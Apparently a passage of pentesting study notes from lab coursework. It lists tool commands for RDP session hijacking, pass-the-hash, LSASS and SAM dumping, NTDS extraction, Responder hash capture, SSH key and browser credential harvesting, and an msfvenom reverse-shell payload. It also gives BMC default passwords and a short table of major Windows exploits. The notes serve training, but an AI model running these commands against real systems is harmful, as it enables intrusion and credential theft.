- `-g` Generate a target list from CIDR network
- `-q` not show per target results

Usage: `fping -asgq 172.16.5.0/23`

## Kerbrute

Stealtheir option for Active directory domain enumeration.

## Oracle TNS

The Oracle Transparent Network Substrate server is a protocol that facilitates communication between Oracle databases and applications over networks. In Oracle RDBMS, a System Identifier (SID) is a unique name that identifies a particular database instance. When a client connects to an Oracle database, it specifies the database's SID along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used. 

Oracle Database Attacking Tool (ODAT) is an open source penetration testing tool written in Python and designed to enumerate and exploit Oracle databases.

Example: `./odat.py all -s 10.10.10.10`

Using ODAT to upload a file to one of the default paths: `./odat.py utlfile -s 10.10.10.10 -d /<SID> -U user -P password  --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`. If we're working with a Linux system, `C:\\inetpub\\wwwroot` becomes `/var/www/html`.

Can use `sqlplus` to connect: `sqlplus user/pass@10.10.10.10/SID`. We can even add `as sysdba` at the end to try to use the user account to jump to the db admin account.
### TNS Configuration
`tnsnames.ora` and `listener.ora` located in the `$ORACLE_HOME/network/admin` directory. Each database or service has a unique entry in `tnsnames.ora` containing the necessary information for clients to connect to the service. `listener.ora` file is a server-side config file that defines the listener process's properties and parameters, which is responsible for recieving incoming client requests.

Setting|Description
-|-
DESCRIPTION|Descriptor that provides a name for the db and its connection type
ADDRESS|Network address of db, including hostname and port
PROTOCOL|Protocol to use when communicating with server
PORT|Port to use when communicating with the server
CONNECT_DATA|Specifies the attributes of the connection such as the service name or SID, protocol and db instance indentifier
INSTANCE_NAME|Name of the db instance the client wants to connect 
SERVICE_NAME|Name of service client wants to connect to
SERVER|Type of server used for the db connection
USER|Username to authenticate with the db server
PASSWORD|Password used to authenticate with db server
SECURITY|Type of security for the connection
VALIDATE_CERT|Whether to validate the certificate using SSL/TLS.
SSL_VERSION|The version of SSL/TLS to use
CONNECT_TIMEOUT|Time limit in seconds for the client to establish a connection
RECEIVE_TIMEOUT|Time limit in seconds for the client to recieve a response from the db
SEND_TIMEOUT|Time limit in seconds for the client to send a response to the db
SQLNET.EXPIRE_TIME|Time limit in seconds for the client to detect a connection has failed
TRACE_LEVEL|Level of tracing for db connection
TRACE_FILE_NAME|Name of the trace file
LOG_FILE|The file where the log info is stored

## IPMI
Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off/unresponsive. It operates on direct connection to the system hardware and does not require an OS.

Three typical uses:
1. Before OS has booted to modify BIOS settings
2. When host is fully powered down
3. Access to a host after a system failure

### IPMI Necessary Components
Acronym|Name|Description
-|-|-
BMC|Baseboard Management Controller|A micro-controller and essential component of IPMI. Typically implemented as an embedded ARM system running Linux and connected directly to the host's motherboard
ICMB|Intelligent Chassis Management Bus|An interface that permits communication from one chassis to another
IPBM|Intelligent Platform Management Bus|Extends the BMC
||IPMI Memory|Stores things such as system even log, repository store data, and more.
||Communications Interfaces|Local system interfaces, serial and LAN interfaces, ICMB and PCI management Bus

#### BMC Default passwords
Product|Username|Password
-|-|-
Deli iDRAC|root|calvin
HP iLO|Administrator|randomized 8-char string consisting of numbers and uppercase letters
Supermicro IPMI|ADMIN|ADMIN

#### BMC Password hashes
If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. We can use the Metasploit module ipmi_dumphashes for this.

## RDP
Remote Desktop Protocol developed by Microsoft. Use xfreerdp to connnect to a host with proper credentials.

A Perl script named (rdp-sec-check.pl)[https://github.com/CiscoCXSecurity/rdp-sec-check] can be used to determine RDP settings

Can use the following to mount a Linux folder: `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`

### Moving sessions

1. `query user`
2. `sc.exe create sessionhijack binpath= "cmd.exe /k tscon TARGET_ID /dest:OUR_SESSION_NAME"`
3. `net start sessionhijack`

### Pass the Hash
To pass the hash we first diable the restricted admin reg key: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

Then we can run: `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`


## John the Ripper

Single crack mode: `john --wordlist=/path/to/wordlist--wordlist=/path/to/wordlist  --format=hash_type hash_file`

### Linux Hash Cracking
- `sudo cp /etc/passwd /tmp/passwd.bak`
- `sudo cp /etc/shadow /tmp/shadow.bak`
- `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`

## Hydra 
Password cracker/brute force tool.

General format: `hydra -L user.list -P password.list protocol://10.10.10.10`

If we wish to use a `username:password` format with a single file we can add the `-C` flag instead of `-L` and `-P`

## HashCat

Password cracker/brute force tool

Default format: `hashcat -m hash-type -a attackmode /path/to/hash /path/to/wordlist`

### Mutate Passwords
`hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`

Where `custom rule` contains the following:

:

c

so0

c so0

sa@

c sa@

c sa@ so0

$!

$! c

$! so0

$! sa@

$! c so0

$! c sa@

$! so0 sa@

$! c so0 sa@

## OS Authentication

### Hash types
ID|Cryptographic Hash Alg
-|-
$1$|MD5
$2a$|Blowfish
$5$|SHA-256
$6$|SHA-512
$sha1$|SHA1crypt
$y$|Yescrypt
$gy$|Gost-yescrypt
$7$|Scrypt

### Linux
Linux stores its hashed passwords in the `/etc/shadow` file in the following format: `username:hashID:salt:hash:day of last change:min age:max age:warning period:inactivity period:expiration date:reserved field`

`/etc/passwd` has the following format: `username:password:uid:gid:comment:home direcotry:cmd exec upon login`

The following generates a list of all the config files: `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`

While this searches specifically for credentials: `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`

Database listing: `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`

Text files: `find /home/* -type f -name "*.txt" -o ! -name "*.*"`

Scripts: `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`

SSH private key: `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`

SSH Public key: `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`

Firefox credentials

1. `ls -l .mozilla/firefox/ | grep default`
2. `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .`

### Windows
#### SAM and LSA dumping 
Windows stores its credentials in a Security Account Manager(SAM) database. User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

Three separate registry hives:

Registry Hive|Description
-|-
hklm\sam|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
hklm\system|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
hklm\security|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

Launching CMD as an admin will allow us to use reg.exe to save copies of the hives:

`reg.exe save hklm\sam C:\sam.save`

After creating a quick SMB share on our local machine with:`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`, we can use the move command to transfer our saved copies: `move sam.save \\localip\CompData`

We can then use the python script `secretsdump.py` to dump the hashes from these registers: `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

#### LSASS
LSSAS manages authentication. It caches credentials locally in memory, creates access tokens, enforces security policies and writes to the Windows security log.

We can manually try to dump the process memory by using Task Manager and clicking "create dump file"

Without a GUI we can use a command-line utility called `rundll32.exe`

We can find the LSASS process list by running `tasklist /svc` or `Get-Process lsass` if we are on PowerShell

Powershell command to dump: `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`

We can use pypkatz, which is a rewrite of Mimikatz written entirely in Python, to parse the memory dump file:`pypykatz lsa minidump /home/lsass.dmp`

## Mimikatz     

Open source app that allows users to view and save authentication credentials.

Export Kerberos tickets: `sekurlsa::tickets /export`

Dump users Kerberos encryption keys: `sekurlsa::ekeys`

### Mimikatz Pass the Hash
`mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`

Kerberos Pass the Ticket: `kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"`

## Rubeus

Does a lot of the the same things that Mimikatz does

## Invvoke-TheHash 

Collection of Powershell functions for performing the pass the hash attacks.

## CeWL
Automatically generates wordlists: `cewl website.com -d 1 -m 1 --lowercase -w filename.txt`

Where `-d` specifies the spider depth, and `-m` is the minimum length of a word.
## Microsoft IIS
Proprietary web software developed by Microsoft. For use with Windows.

Supported execution files:

- .asp
- .aspx
- .config
- .php

### WebDav

HTTP extension to modify files on web server. Additionally a set of extensions on top of http protocol to allow for collaborative work

#### Davtest
Scans, authenticates and exploits web dav server
#### Cadaver
Supports manipulation of webdav, can be used to log in to server and upload a shell

## WinRM
Windows remote management protocol over HTTP(s).

## WMI
Windows Management Instrumentation (WMI) allows read and write access to almost all settings on Windows systems

### Evil-WinRM
General usage: `evil-winrm -i <target-IP> -u <username> -p <password>`

Pass the Hash: `evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`

## Lazange
[Lazange.exe](https://github.com/AlessandroZ/LaZagne) is a Windows exe which retrieves insecurely stored passwords.

Format: `start lazange.exe all`

Additionally there exists a Python version which can be used for Linux.
## Curl

Command line HTTP request generator

- `-IL` to grab banner

## WafW00f
Web application firewall fingerprinting tool.

## ffuf 

We can automate virtual host searching with a wordlist: `cat ./vhosts | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://10.10.10.10 -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done`

We can further automate this process using ffuf: `ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612`

We can also use ffuf to discover folders and files on a website: `ffuf -recursion -recursion-depth 1 -u http://10.10.10.10/FUZZ -w path/to/wordlist.txt`

Note: we can use CeWL to create a simple wordlist using keywords from the website which are longer than 5 chars: `cewl -m5 --lowercase -w wordlist.txt http://10.10.10.10

## The Harvester

Open source info harvester. We can create a text file with 

baidu

bufferoverun

crtsh

hackertarget

otx

projectdiscovery

rapiddns

sublist3r

threatcrowd

trello

urlscan

vhost

virustotal

zoomeye

then run `cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done`

Extract and sort subdomains: `cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "${TARGET}_theHarvester.txt"`

## crackmapexec
Tool to brute force and execute commands over the following protocols

- MySQL
- SMB
- WinRM
- SSH

General format: `crackmapexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>`

SMB enum shares: `crackmapexec smb 10.129.14.128 --shares -u '' -p ''`

Dumping LSA secrets remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`

Dumping SAM remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

Dumping NTDS file: `crackmapexec smb 10.10.10.10 -u user -p pass --ntds`

Pass the Hash: `crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`

Enumerate loggeed on users: `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`

Enumerating general users: `crackmapexec smb 172.16.5.5 --users`

## Responder
r. Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Usage: `sudo responder -I ens33`

After starting Responder and executing one of the following, we can steal some hashes

- `EXEC master..xp_dirtree '\\10.10.110.17\share\'`
- `EXEC master..xp_subdirs '\\10.10.110.17\share\'`

## enum4linux
Enumeration for linux through a python script

See also [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

Usage: `enum4linux -P 10.10.10.10`
 
Making a target user list: `enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

## whatweb
Automate web application enumeration

- `whatweb 10.10.10.10`
- `whatweb --no-errors 10.10.10.0/25`

## Footprinting


## enum4linux
Enumeration for linux through a python script

See also [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
We can use the `whois` command to try and use the whois protocol

## Certificates 

[crt.sh](https://crt.sh) is a certificate transparency service. 

JSON format: `curl -s https://crt.sh/\?q\=website.com\&output\=json | jq .`

Even better JSON: `curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"`

OpenSSL: `openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' -connect "${TARGET}:${PORT}" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\n|g' -e 's|^\*.*||g' | tr -d ',' | sort -u`

[censys.io](https://crt.sh) is a 


## [GrayHatWarfare](https://buckets.grayhatwarfare.com/)

Similar to using google for finding publicly accessable files

## Upgrading TTY

Spawn TTY out of netcat reverse shell:
1. run `python -c 'import pty; pty.spawn("/bin/bash")'`
2. background the shell
3. run `stty raw -echo` on our local terminal
4. foreground the shell

Change parameters to use tty shell like a full SSH connection:
1. `echo $TERM` on local machine, then`export TERM=`
2. `stty size` on local machine, then `stty rows 99 columns 999` 

## Transferring files

### wget

After running a python HTTP server on our local machine we can use wget to download files on the compromised machine with `wget http://10.10.10.10:8080/file.txt`

### scp

scp only works with valid ssh user credentials on the remote host: `scp file.txt user@10.10.10.10:/path/to/file.txt`

### Base 64
If remote host has protections from downloading files, a trick is to encode the file into base64, copy it as a string and then decode.

To encode binary file called "shell": `base64 shell -w 0`

To decode and paste into a file, where string is the result of the encoding command: `echo string | base64 -d > shell`

PowerShell encode in base64: `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`

### Python File Transfer

Python2: `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

Python3: `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

### PHP File Transfer

`php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`

`php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`

## xsltproc

Converts XML format to HTML: `xsltproc target.xml -o target.html`

## Laudanum

Repository of ready made files which can be used to inject into victim and gain access via a reverse shell.

Laudanum files can be found at: `/usr/share/laudanum`. Need to edit files with proper IP address and port numbers.

## Metasploit

Penetration testing framework

- `db_import scan.xml` to import nmap scan output
- `db_nmap` to use directly

Payloads with slashes separating them are staged (/shell/reverse_tcp) while underscores (windows/meterpreter_reverse_tcp) signify stageless.

Ping scan: `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`

### Searching

We can search for specific categories with: `search type:exploit platform:windows cve:2021 rank:excellent microsoft`

### Databases

We first start the postgresql service through `sudo systemctl start postgresql`. We can then initialize the metasploit db through `sudo msfdb status`. Then run through `sudo msfdb run`

Data will remain persistent unless console is closed, to backup: `db_export -f xml backup.xlm`

## Payloads
### MSFvenom
Crafts payloads.

List all payloads: `msfvenom -l payloads`

Crafting a payload: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`

## Ping Sweep one liners

Linux: `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`

CMD: `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`

### Payload Types to Consider (Windows)
Type|Description
-|-
DLL| A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
Batch|Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.
VBS|VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
MSI|.MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell.
Powershell|Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.



# Pentesting Methodology

## Enumeration Principles
1. There is more than meets the eye. Consider all points of view.
2. Distinguish between what we see and what we do not see
3. There are always ways to gain more information. Understand the target.

## Enumeration plan
Layer|Description|Categories
-|-|-
Internet presence|Identification of internet presence and externally accessible infrastructure|Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures
Gateway|Identify the possible security measures to protect the company's external and internal infrastructure.|Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare
Accessible Services|Identify accessible interfaces and services that are hosted externally or internally|Service Type, Functionality, Configuration, Port, Version, Interface
Processes|Identify the internal processes, sources, and destinations associated with the services|PID, Processed Data, Tasks, Source, Destination
Privileges|Identification of the internal permissions and privileges to the accessible services|Groups, Users, Permissions, Restrictions, Environment
OS Setup|Identification of the internal components and systems setup|OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files

## Big Shot Windows Exploits
Vulnerability|Description
-|-
MS08-067|MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.
Eternal Blue|MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.
PrintNightmare|A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
BlueKeep|CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.
Sigred|CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.
SeriousSam|CVE 2021-36924 exploits an issue with the way Windows handles permission on the C:\Windows\system32\config folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.
Zerologon|CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.
